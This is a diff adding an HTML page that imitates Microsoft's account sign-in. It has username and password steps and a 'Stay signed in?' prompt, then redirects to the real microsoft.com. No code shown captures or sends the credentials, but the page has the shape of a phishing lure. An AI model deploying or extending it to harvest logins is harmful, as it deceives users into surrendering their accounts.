@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="../res/ms-favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="../css/microsoft.css" />
+</head>
+
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="../res/microsoft-logo.png" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Sign in with a security key
+                        <img src="../res/microsoft-question.png" alt="Question img">
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Next</button>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="../res/ms-key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="../res/microsoft-logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="../res/microsoft-back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="../res/microsoft-logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const unReq = "Enter a valid email address, phone number, or Skype name.";
+            const pwdReq = "Please enter the password for your Microsoft account.";
+            const unameInp = document.getElementById('inp_uname');
+            const pwdInp = document.getElementById('inp_pwd');
+            let view = "uname";
+
+            let unameVal = pwdVal = false;
+            const nxt = document.getElementById('btn_next');
+
+            nxt.addEventListener('click', () => {
+                validate();
+                if (unameVal) {
+                    document.getElementById("section_uname").classList.toggle('d-none');
+                    document.getElementById('section_pwd').classList.remove('d-none');
+                    document.querySelectorAll('#user_identity').forEach((e) => {
+                        e.innerText = unameInp.value;
+                    });
+                    view = "pwd";
+                }
+            });
+
+            const sig = document.getElementById('btn_sig');
+
+            sig.addEventListener('click', () => {
+                validate();
+                if (pwdVal) {
+                    document.getElementById("section_pwd").classList.toggle('d-none');
+                    document.getElementById('section_final').classList.remove('d-none');
+                    view = "final";
+                }
+            });
+
+            function validate() {
+                function unameValAction(type) {
+                    if (!type) {
+                        document.getElementById('error_uname').innerText = unReq;
+                        unameInp.classList.add('error-inp');
+                        unameVal = false;
+                    } else {
+                        document.getElementById('error_uname').innerText = "";
+                        unameInp.classList.remove('error-inp');
+                        unameVal = true;
+                    }
+                }
+
+                function pwdValAction(type) {
+                    if (!type) {
+                        document.getElementById('error_pwd').innerText = pwdReq;
+                        pwdInp.classList.add('error-inp');
+                        pwdVal = false;
+                    } else {
+                        document.getElementById('error_pwd').innerText = "";
+                        pwdInp.classList.remove('error-inp');
+                        pwdVal = true;
+                    }
+                }
+
+                if (view === "uname") {
+                    if (unameInp.value.trim() === "") {
+                        unameValAction(false);
+                    } else {
+                        unameValAction(true);
+                    }
+                } else if (view === "pwd") {
+                    if (pwdInp.value.trim() === "") {
+                        pwdValAction(false);
+                    } else {
+                        pwdValAction(true);
+                    }
+                }
+            }
+
+            document.querySelector('.back').addEventListener('click', () => {
+                view = "uname";
+                document.getElementById("section_pwd").classList.toggle('d-none');
+                document.getElementById('section_uname').classList.remove('d-none');
+            });
+
+            document.querySelectorAll('#btn_final').forEach((b) => {
+                b.addEventListener('click', () => {
+                    window.location.href = "https://www.microsoft.com/en-in";
+                });
+            });
+        });
+    </script>
+</body>
+
+</html>
